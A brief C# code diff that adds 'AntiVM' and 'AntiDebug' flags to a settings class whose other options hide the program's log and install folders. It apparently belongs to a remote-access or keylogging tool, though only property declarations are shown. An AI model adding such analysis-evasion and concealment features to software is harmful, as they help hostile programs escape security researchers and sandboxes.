@@ -21,5 +21,7 @@
         public string LogDirectoryName { get; set; }
         public bool HideLogDirectory { get; set; }
         public bool HideInstallSubdirectory { get; set; }
+        public bool AntiVM { get; set; }
+        public bool AntiDebug { get; set; }
     }
 }
